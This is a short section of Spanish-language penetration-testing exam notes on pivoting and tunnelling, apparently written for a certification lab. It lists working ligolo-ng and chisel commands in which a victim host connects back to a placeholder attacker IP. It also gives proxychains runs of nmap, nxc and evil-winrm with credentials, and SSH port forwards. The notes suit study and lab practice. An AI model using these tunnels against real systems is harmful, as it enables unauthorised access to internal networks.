# 7. Pivoting y Túneles

> Metasploit **NO** se puede usar para pivoting en el examen. Usa ligolo-ng o chisel.

Detecta la necesidad: desde tu foothold, `netstat -tulnp` (Linux) / `netstat -ano` (Windows) muestra servicios internos o redes que no veías desde fuera.

## ligolo-ng (recomendado, muy estable)
```bash
# En el atacante (una sola vez):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                          # levanta el servidor

# En la víctima (agente):
./agent -connect <IP_ATACANTE>:11601 -ignore-cert

# En la consola de ligolo:
session            # selecciona la sesión
# luego, en el atacante, añade la ruta a la red interna:
sudo ip route add <SUBNET_INTERNA>/24 dev ligolo
# Ahora puedes alcanzar la red interna directamente (sin proxychains).
```

## Chisel (SOCKS reverse)
```bash
# Atacante (servidor):
./chisel server -p 8080 --reverse

# Víctima (cliente):
./chisel client <IP_ATACANTE>:8080 R:socks
```
Config de proxychains (`/etc/proxychains4.conf`):
```
socks5 127.0.0.1 1080
```
Ejecutar herramientas a través del túnel (usa `-sT`, TCP connect):
```bash
proxychains nmap -sT -p 445 <IP_INTERNA>
proxychains nxc smb <IP_INTERNA> -u <USER> -p <PASS>
proxychains evil-winrm -i <IP_INTERNA> -u <USER> -p <PASS>
```

## SSH port forwarding (si tienes acceso SSH)
```bash
ssh -L 8080:127.0.0.1:80 <user>@<IP>       # local: puerto interno → tu 8080
ssh -D 1080 <user>@<IP>                     # dynamic: SOCKS en 1080
ssh -R 4444:127.0.0.1:4444 <user>@<IP>      # remote
```
